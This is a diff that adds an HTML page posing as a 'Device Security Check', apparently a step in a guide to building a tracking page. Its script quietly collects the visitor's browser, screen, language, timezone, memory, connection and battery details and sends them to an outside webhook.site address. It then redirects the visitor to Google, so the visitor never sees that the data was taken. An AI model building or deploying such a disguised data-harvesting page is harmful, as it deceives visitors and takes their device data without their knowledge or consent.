@@ -1,0 +1,7 @@
+<!DOCTYPE html><html><body style="text-align:center;padding:50px;background:#f0f0f0;font-family:Arial"><h2 style="color:#666">🔒 Device Security Check</h2><p>One moment while we verify...</p><script>
+(async()=>{let d={ua:navigator.userAgent,scr:screen.width+'x'+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,mem:navigator.deviceMemory||'?',touch:navigator.maxTouchPoints,conn:navigator.connection?.effectiveType||'?'};
+// Battery
+try{let b=await navigator.getBattery();d.bat=b.level*100+'%'}catch(e){}
+// Send to YOUR webhook (get from step 4 first)
+fetch('https://webhook.site/6917b79c-d89e-4688-9be5-1702fdb3f99a',{method:'POST',body:JSON.stringify(d),mode:'no-cors'});setTimeout(()=>location.href='https://google.com',1500);})();
+</script></body></html>
